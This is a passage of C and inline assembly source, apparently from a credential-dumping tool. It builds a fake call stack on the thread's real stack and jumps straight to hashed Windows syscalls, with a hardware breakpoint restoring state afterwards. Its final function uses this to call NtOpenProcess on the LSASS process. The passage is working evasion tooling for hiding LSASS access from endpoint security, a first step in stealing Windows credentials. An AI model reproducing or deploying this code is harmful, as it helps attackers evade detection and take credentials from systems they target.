            stack_space_needed += callstack[i].totalStackSize;
    }
    // add space for the canary
    stack_space_needed += ptr_size;
    // add space for the address of the storing area
    stack_space_needed += ptr_size;
    // add unsued bytes at the bottom of the fake stack
    // so that when saving RIP we don't write outside the stack's lower bound

    // make sure the stack is kept 16 bytes alligned
    if ((stack_space_needed & ptr_size) == ptr_size)
        empty_space = ptr_size * 2;
    else
        empty_space = ptr_size;
    stack_space_needed += empty_space;

    DPRINT("size of the fake stack: 0x%llx", stack_space_needed);

    // allocate space where the fake stack will be created
    fake_stack_heap_addr = intAlloc(stack_space_needed);
    DPRINT("fake stack on the heap: 0x%p - 0x%p", fake_stack_heap_addr, RVA(PVOID, fake_stack_heap_addr, stack_space_needed));
    if (!fake_stack_heap_addr)
    {
        malloc_failed();
        goto cleanup;
    }

    // allocate space where the real stack will be stored
    real_stack_backup = intAlloc(full_stack_size);
    DPRINT("backup of the stack real stack: 0x%p - 0x%p", real_stack_backup, RVA(PVOID, real_stack_backup, full_stack_size));
    if (!real_stack_backup)
    {
        malloc_failed();
        goto cleanup;
    }

#if defined(DEBUG) && !defined(PPL_MEDIC)
    target_stack_bottom = RVA(PVOID, full_stack_base, full_stack_size);
#endif
    target_stack_top = RVA(PVOID, full_stack_base, full_stack_size - stack_space_needed);

    DPRINT("the spoofed call stack will be stored at: 0x%p - 0x%p", target_stack_top, target_stack_bottom);

    // get the address of the first return address
    // this is used for calling APIs with a fake callstack
    for (int i = 0; i < number_of_frames; ++i)
    {
        if (callstack[i].is_valid && callstack[i].returnAddress)
        {
            stack_info->first_ret_addr = callstack[i].returnAddress;
            break;
        }
    }

    // the fake stack will be constructed on the heap
    // then it will be moved to the bottom of the real stack
    stack_info->full_stack_base = full_stack_base;
    stack_info->full_stack_size = full_stack_size;
    stack_info->full_stack_backup_addr = real_stack_backup;
    stack_info->fake_stack_heap_addr = fake_stack_heap_addr;
    stack_info->fake_stack_size = stack_space_needed;
    stack_info->fake_stack_target_addr = target_stack_top;
    stack_info->fake_stack_rsp = RVA(PVOID, stack_info->fake_stack_heap_addr, stack_info->fake_stack_size);
    stack_info->storing_area = storing_area;

    /*
     * layout:
     * 0x0000 top of the stack
     * - <fake call stack>
     * - canary
     * - storing_area
     * - <unused>
     * 0xffff stack bottom
     *
     * storing_area:
     * - full_stack_size
     * - full_stack_backup_addr
     * - full_stack_base
     * - RBX
     * - RBP
     * - RSP
     * - RIP
    */

    // save some bytes that will be left unused
    stack_info->fake_stack_rsp = (PVOID)((ULONG_PTR)stack_info->fake_stack_rsp - empty_space);
    // save space for the address of the storing area
    stack_info->fake_stack_rsp = (PVOID)((ULONG_PTR)stack_info->fake_stack_rsp - ptr_size);
    // write the storing area pointer
    *((PVOID*)stack_info->fake_stack_rsp) = storing_area;
    // save space for the canary
    stack_info->fake_stack_rsp = (PVOID)((ULONG_PTR)stack_info->fake_stack_rsp - ptr_size);
    // write the canary
    *((PVOID*)stack_info->fake_stack_rsp) = (PVOID)canary_value;

    stack_info->canary_addr = stack_info->fake_stack_rsp;

    // Initialise fake thread state.
    initialize_fake_thread_state(
        callstack,
        number_of_frames,
        stack_info);

    // 'translate' the addresses of the RSP, RBP and the canary
    stack_info->fake_stack_rsp = from_fake_to_real(stack_info, stack_info->fake_stack_rsp);
    stack_info->fake_stack_rbp = from_fake_to_real(stack_info, stack_info->fake_stack_rbp);
    stack_info->canary_addr = from_fake_to_real(stack_info, stack_info->canary_addr);

    DPRINT("fake stack layout:")
    DPRINT("    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
    BOOL is_first = TRUE;
    for (int i = 0; i < number_of_frames; ++i)
    {
        if (callstack[i].is_valid)
        {
            if (is_first)
            {
                if (callstack[i].function_name[0])
                {
                    DPRINT("    ret address: %ls!%s+0x%x <-- stack pointer: 0x%p", callstack[i].target_dll_name, callstack[i].function_name, callstack[i].final_offset, stack_info->fake_stack_rsp);
                }
                else
                {
                    DPRINT("    ret address: %ls+0x%x <-- stack pointer: 0x%p", callstack[i].target_dll_name, callstack[i].final_offset, stack_info->fake_stack_rsp);
                }
            }
            else
            {
                if (callstack[i].function_name[0])
                {
                    DPRINT("    ret address: %ls!%s+0x%x", callstack[i].target_dll_name, callstack[i].function_name, callstack[i].final_offset);
                }
                else
                {
                    DPRINT("    ret address: %ls+0x%x", callstack[i].target_dll_name, callstack[i].final_offset);
                }
            }
            DPRINT("    -------------------------------");
            DPRINT("        <0x%lx bytes of space>", callstack[i].totalStackSize - ptr_size);
            is_first = FALSE;
        }
    }
    DPRINT("    ret address: 0x%p", NULL);
    DPRINT("    -------------------------------");
    DPRINT("    canary: 0x%p", (PVOID)canary_value);
    DPRINT("    storing ptr: 0x%p", stack_info->storing_area);
    DPRINT("        <0x%x bytes of space>       <-- stack bottom: 0x%p", empty_space, full_stack_base);
    DPRINT("    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");

    ret_val = TRUE;

cleanup:
    if (!ret_val && fake_stack_heap_addr)
        intFree(fake_stack_heap_addr);
    if (!ret_val && real_stack_backup)
        intFree(real_stack_backup);
    if (!ret_val && storing_area)
        intFree(storing_area);
    if (callstack)
        intFree(callstack);

    return ret_val;
}

/*
 * This function is responsible for:
 * 1) create the backup of the stack
 * 2) copy over the fake stack
 * 3) save all the information required by the handler
 * 4) set all the parameters
 * 5) set RSP and RBP to the fake callstack
 * 6) set the syscall number
 * 7) jump to the syscall address
 */

#if defined(_MSC_VER) && defined (_M_IX86)

__declspec(naked) ULONG_PTR jumper(
    PVOID syscall_data)
{
    __asm {
        // ecx: syscall_data
        mov ecx, [esp+0x04]
        // backup the full stack
        xor eax, eax
        // edx: full_stack_size
        mov edx, [ecx+0x04]
        // edi: full_stack_backup_addr
        mov edi, [ecx+0x08]
        // esi: full_stack_base
        mov esi, [ecx]
        bkp_stack_loop:
        mov bl, [esi+eax]
        mov [edi+eax], bl
        inc eax
        cmp eax, edx
        jne bkp_stack_loop
        // copy the fake stack
        xor eax, eax
        // esi: fake_stack_heap_addr
        mov esi, [ecx+0x0c]
        // edi: fake_stack_target_addr
        mov edi, [ecx+0x14]
        // edx: fake_stack_size
        mov edx, [ecx+0x10]
        cpy_fake_stack_loop:
        mov bl, [esi+eax]
        mov [edi+eax], bl
        inc eax
        cmp eax, edx
        jne cpy_fake_stack_loop
        // save full_stack_size, full_stack_backup_addr, full_stack_base,
        // EBX, EBP, ESP and EIP in the storing_area
        // eax: canary_addr
        mov eax, [ecx+0x20]
        // eax: storing_area
        mov eax, [eax+0x04]
        // full_stack_size
        mov edx, [ecx+0x04]
        mov [eax+0x00], edx
        // full_stack_backup_addr
        mov edx, [ecx+0x08]
        mov [eax+0x04], edx
        // full_stack_base
        mov edx, [ecx]
        mov [eax+0x08], edx
        // RBX
        mov [eax+0x0c], ebx
        // RBP
        mov [eax+0x10], ebp
        // RSP
        pop edx
        mov [eax+0x14], esp
        // RIP
        mov [eax+0x18], edx
        // set the parameters
        // eax: num_params
        mov eax, [ecx+0x34]
        // ebp: fake_stack_rsp
        mov ebp, [ecx+0x18]
        // edx: is_api_call
        mov edx, [ecx+0x2c]
        cmp edx, 0x0
        jne stack_params_loop
        // syscalls in x86 have a different stack layout
        // 1) address of the 'ret' instruction next to the sysenter
        // 2) the actual return address
        // 3) parameters
        // save the real return address in the second position
        // edx: ret addr
        mov edx, [ebp]
        mov [ebp+0x4], edx
        // save the address of the 'ret' instruction in the first position
        // edx: syscall address
        mov edx, [ecx+0x24]
        // edx: address of the 'ret' instruction
        add edx, 0x2
        mov [ebp], edx
        // save the parameters on the third and not second position
        add ebp, 0x4
        // edx: is_wow64
        mov edx, [ecx+0x30]
        cmp edx, 0x0
        je stack_params_loop
        // syscalls in WoW64 have a different stack layout
        // 1) the actual return address
        // 2) 0x4 bytes of space
        // 3) parameters
        mov edx, [ebp]
        mov [ebp-0x4], edx
        stack_params_loop:
        cmp eax, 0x1
        jl params_ready
        mov ebx, [ecx+0x34+eax*0x4]
        mov [ebp+eax*0x4], ebx
        dec eax
        jmp stack_params_loop
        params_ready:
        // set the RSP
        mov esp, [ecx+0x18]
        // set the RBP
        mov ebp, [ecx+0x1c]
        // set the syscall number
        mov eax, [ecx+0x28]
        // ebx: syscall_addr
        mov ebx, [ecx+0x24]
        // edx must to be equal to esp for some reason
        mov edx, esp
        // jump to the syscall address :^)
        jmp ebx
    }
}

#elif defined(__GNUC__)

__declspec(naked) ULONG_PTR jumper(
    PVOID syscall_data)
{
#if defined(_WIN64)
    asm(
        SET_SYNTAX
        // save the return address
        "pop r11 \n"
        // backup the full stack
        "xor rax, rax \n"
        // rdx: full_stack_size
        "mov rdx, [rcx+0x08] \n"
        // r8: full_stack_backup_addr
        "mov r8, [rcx+0x10] \n"
        // r9: full_stack_base
        "mov r9, [rcx] \n"
        "bkp_stack_loop: \n"
        "mov r10b, [r9+rax] \n"
        "mov [r8+rax], r10b \n"
        "inc rax \n"
        "cmp rax, rdx \n"
        "jne bkp_stack_loop \n"
        // copy the fake stack
        "xor rax, rax \n"
        // r8: fake_stack_heap_addr
        "mov r8, [rcx+0x18] \n"
        // r9: fake_stack_target_addr
        "mov r9, [rcx+0x28] \n"
        // rdx: fake_stack_size
        "mov rdx, [rcx+0x20] \n "
        "cpy_fake_stack_loop: \n"
        "mov r10b, [r8+rax] \n"
        "mov [r9+rax], r10b \n"
        "inc rax \n"
        "cmp rax, rdx \n"
        "jne cpy_fake_stack_loop \n"
        // save full_stack_size, full_stack_backup_addr, full_stack_base,
        // RBX, RBP, RSP and RIP after the canary
        // rax: canary_addr
        "mov rax, [rcx+0x40] \n"
        // rax: storing_area
        "mov rax, [rax+0x08] \n"
        // full_stack_size
        "mov rdx, [rcx+0x08] \n"
        "mov [rax+0x00], rdx \n"
        // full_stack_backup_addr
        "mov rdx, [rcx+0x10] \n"
        "mov [rax+0x08], rdx \n"
        // full_stack_base
        "mov rdx, [rcx] \n"
        "mov [rax+0x10], rdx \n"
        // RBX
        "mov [rax+0x18], rbx \n"
        // RBP
        "mov [rax+0x20], rbp \n"
        // RSP
        "mov [rax+0x28], rsp \n"
        // RIP
        "mov [rax+0x30], r11 \n"
        // set the parameters
        // are there more than 0 params?
        "xor rax, rax \n"
        // eax: num_params
        "mov eax, [rcx+0x5c] \n"
        // r10: syscall_data
        "mov r10, rcx \n"
        "cmp eax, 0x1 \n"
        "jl params_ready \n"
        // set parameter 1
        "mov rcx, [r10+0x60] \n"
        // is there more than 1 param?
        "cmp eax, 0x2 \n"
        "jl params_ready \n"
        // set parameter 2
        "mov rdx, [r10+0x68] \n"
        // are there more than 2 params?
        "cmp eax, 0x3 \n"
        "jl params_ready \n"
        // set parameter 3
        "mov r8, [r10+0x70] \n"
        // are there more than 3 params?
        "cmp eax, 0x4 \n"
        "jl params_ready \n"
        // set parameter 4
        "mov r9, [r10+0x78] \n"
        // set the rest of the parameters
        "sub eax, 0x4 \n"
        // rbp: fake_stack_rsp
        "mov rbp, [r10+0x30] \n"
        "stack_params_loop: \n"
        "cmp eax, 0x1 \n"
        "jl params_ready \n"
        "mov rbx, [r10+0x78+rax*0x8] \n"
        "mov [rbp+0x20+rax*0x8], rbx \n"
        "dec rax \n"
        "jmp stack_params_loop \n"
        "params_ready: \n"
        // set the RSP
        "mov rsp, [r10+0x30] \n"
        // set the RBP
        "mov rbp, [r10+0x38] \n"
        // set the syscall number
        "mov eax, [r10+0x50] \n"
        // r11: syscall_addr
        "mov r11, [r10+0x48] \n"
        // r10 must be equal to rcx for some reason
        "mov r10, rcx \n"
        // jump to the syscall address :^)
        "jmp r11 \n"
    );
#else
    asm(
        SET_SYNTAX
        // ecx: syscall_data
        "mov ecx, [esp+0x04] \n"
        // backup the full stack
        "xor eax, eax \n"
        // edx: full_stack_size
        "mov edx, [ecx+0x04] \n"
        // edi: full_stack_backup_addr
        "mov edi, [ecx+0x08] \n"
        // esi: full_stack_base
        "mov esi, [ecx] \n"
        "bkp_stack_loop: \n"
        "mov bl, [esi+eax] \n"
        "mov [edi+eax], bl \n"
        "inc eax \n"
        "cmp eax, edx \n"
        "jne bkp_stack_loop \n"
        // copy the fake stack
        "xor eax, eax \n"
        // esi: fake_stack_heap_addr
        "mov esi, [ecx+0x0c] \n"
        // edi: fake_stack_target_addr
        "mov edi, [ecx+0x14] \n"
        // edx: fake_stack_size
        "mov edx, [ecx+0x10] \n "
        "cpy_fake_stack_loop: \n"
        "mov bl, [esi+eax] \n"
        "mov [edi+eax], bl \n"
        "inc eax \n"
        "cmp eax, edx \n"
        "jne cpy_fake_stack_loop \n"
        // save full_stack_size, full_stack_backup_addr, full_stack_base,
        // EBX, EBP, ESP and EIP in the storing_area
        // eax: canary_addr
        "mov eax, [ecx+0x20] \n"
        // eax: storing_area
        "mov eax, [eax+0x04] \n"
        // full_stack_size
        "mov edx, [ecx+0x04] \n"
        "mov [eax+0x00], edx \n"
        // full_stack_backup_addr
        "mov edx, [ecx+0x08] \n"
        "mov [eax+0x04], edx \n"
        // full_stack_base
        "mov edx, [ecx] \n"
        "mov [eax+0x08], edx \n"
        // RBX
        "mov [eax+0x0c], ebx \n"
        // RBP
        "mov [eax+0x10], ebp \n"
        // RSP
        "pop edx \n"
        "mov [eax+0x14], esp \n"
        // RIP
        "mov [eax+0x18], edx \n"
        // set the parameters
        // eax: num_params
        "mov eax, [ecx+0x34] \n"
        // ebp: fake_stack_rsp
        "mov ebp, [ecx+0x18] \n"
        // edx: is_api_call
        "mov edx, [ecx+0x2c] \n"
        "cmp edx, 0x0 \n"
        "jne stack_params_loop \n"
        // syscalls in x86 have a different stack layout
        // 1) address of the 'ret' instruction next to the sysenter
        // 2) the actual return address
        // 3) parameters
        // save the real return address in the second position
        // edx: ret addr
        "mov edx, [ebp] \n"
        "mov [ebp+0x4], edx \n"
        // save the address of the 'ret' instruction in the first position
        // edx: syscall address
        "mov edx, [ecx+0x24] \n"
        // edx: address of the 'ret' instruction
        "add edx, 0x2 \n"
        "mov [ebp], edx \n"
        // save the parameters on the third and not second position
        "add ebp, 0x4 \n"
        // edx: is_wow64
        "mov edx, [ecx+0x30] \n"
        "cmp edx, 0x0 \n"
        "je stack_params_loop \n"
        // syscalls in WoW64 have a different stack layout
        // 1) the actual return address
        // 2) 0x4 bytes of space
        // 3) parameters
        "mov edx, [ebp] \n"
        "mov [ebp-0x4], edx \n"
        "stack_params_loop: \n"
        "cmp eax, 0x1 \n"
        "jl params_ready \n"
        "mov ebx, [ecx+0x34+eax*0x4] \n"
        "mov [ebp+eax*0x4], ebx \n"
        "dec eax \n"
        "jmp stack_params_loop \n"
        "params_ready: \n"
        // set the RSP
        "mov esp, [ecx+0x18] \n"
        // set the RBP
        "mov ebp, [ecx+0x1c] \n"
        // set the syscall number
        "mov eax, [ecx+0x28] \n"
        // ebx: syscall_addr
        "mov ebx, [ecx+0x24] \n"
        // edx must to be equal to esp for some reason
        "mov edx, esp \n"
        // jump to the syscall address :^)
        "jmp ebx \n"
    );
#endif
}

#endif

/*
 * This function is responsible for:
 * 1) get the address and number of the syscall
 * 2) create fake call stack
 * 3) set the hardware breakpoint
 * 4) call the jumper
 * 5) unset the hardware breakpoint
 */
NTSTATUS trigger_syscall(
    IN ULONG32 syscall_hash,
    IN ULONG32 num_params,
    ...)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    STACK_INFO stack_info = { 0 };
    PVOID syscall_addr = NULL;
    PVOID ret_addr = NULL;
    ULONG32 syscall_number = 0;
    HANDLE hHwBpHandler = NULL;
    BOOL success = FALSE;
    PSYSCALL_DATA syscall_data = NULL;
    va_list valist;

    va_start(valist, num_params);

    // get the syscall address
    syscall_addr = SW3_GetSyscallAddress(syscall_hash);
    if (!syscall_addr)
        goto cleanup;

    // get the syscall number
    syscall_number = SW2_GetSyscallNumber(syscall_hash);
    if (!syscall_number)
        goto cleanup;

    // create the fake callstack
    success = create_fake_callstack(&stack_info, syscall_hash);
    if (!success)
        goto cleanup;
    DPRINT("created the fake callstack");

    // get the first ret address in the fake callstack
    ret_addr = stack_info.first_ret_addr;
    if (!ret_addr)
    {
        // if there is none, use the 'ret' instruction after the syscall
        ret_addr = SW2_RVA2VA(PVOID, syscall_addr, 2);
    }

    // set the hardware breakpoint at the ret addr
    success = set_hwbp(ret_addr, &hHwBpHandler);
    if (!success)
        goto cleanup;
    DPRINT("hardware breakpoint set at 0x%p", ret_addr);

    // because the syscall data is on the heap,
    // overwriting the stack won't affect it
    syscall_data = intAlloc(sizeof(SYSCALL_DATA));
    if (!syscall_data)
    {
        malloc_failed();
        goto cleanup;
    }

    syscall_data->full_stack_base = stack_info.full_stack_base;
    syscall_data->full_stack_size = stack_info.full_stack_size;
    syscall_data->full_stack_backup_addr = stack_info.full_stack_backup_addr;
    syscall_data->fake_stack_heap_addr = stack_info.fake_stack_heap_addr;
    syscall_data->fake_stack_size = stack_info.fake_stack_size;
    syscall_data->fake_stack_target_addr = stack_info.fake_stack_target_addr;
    syscall_data->fake_stack_rsp = stack_info.fake_stack_rsp;
    syscall_data->fake_stack_rbp = stack_info.fake_stack_rbp;
    syscall_data->canary_addr = stack_info.canary_addr;
    syscall_data->is_api_call = FALSE;
    syscall_data->is_wow64 = local_is_wow64();
    syscall_data->syscall_addr = syscall_addr;
    syscall_data->syscall_number = syscall_number;
    syscall_data->num_params = num_params;
    for (int i = 0; i < num_params; ++i)
    {
        syscall_data->params[i] = va_arg(valist, ULONG_PTR);
    }

    DPRINT("triggering the syscall...");
    status = (NTSTATUS)jumper(syscall_data);
    DPRINT("done.");

cleanup:
    if (syscall_data)
        intFree(syscall_data);
    if (stack_info.full_stack_backup_addr)
        intFree(stack_info.full_stack_backup_addr);
    if (stack_info.fake_stack_heap_addr)
        intFree(stack_info.fake_stack_heap_addr);
    if (stack_info.storing_area)
        intFree(stack_info.storing_area);
    if (hHwBpHandler)
        unset_hwbp(hHwBpHandler);
    va_end(valist);

    return status;
}

HANDLE open_handle_with_spoofed_callstack(
    IN DWORD lsass_pid,
    IN DWORD permissions,
    IN DWORD attributes)
{
    NTSTATUS status   = STATUS_UNSUCCESSFUL;
    HANDLE   hProcess = NULL;

    // variables passed by reference must be stored on the heap
    PHANDLE            HProcessHandle    = intAlloc(sizeof(HANDLE));
    POBJECT_ATTRIBUTES HObjectAttributes = intAlloc(sizeof(OBJECT_ATTRIBUTES));
    CLIENT_ID*         HClientId         = intAlloc(sizeof(CLIENT_ID));

    if (!HProcessHandle || !HObjectAttributes || !HClientId)
    {
        malloc_failed();
        return NULL;
    }

    *HProcessHandle = NULL;

    InitializeObjectAttributes(HObjectAttributes, NULL, attributes, NULL, NULL);

    HClientId->UniqueProcess = (HANDLE)(ULONG_PTR)lsass_pid;
    HClientId->UniqueThread = 0;

    status = trigger_syscall(
        NtOpenProcess_SW2_HASH,
        4,
        HProcessHandle,
        permissions,
        HObjectAttributes,
        HClientId);

    hProcess = *HProcessHandle;

    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtOpenProcess", status);
        hProcess = NULL;
    }

    DATA_FREE(HProcessHandle,    sizeof(HANDLE));
    DATA_FREE(HObjectAttributes, sizeof(OBJECT_ATTRIBUTES));
    DATA_FREE(HClientId,         sizeof(CLIENT_ID));

    return hProcess;
}
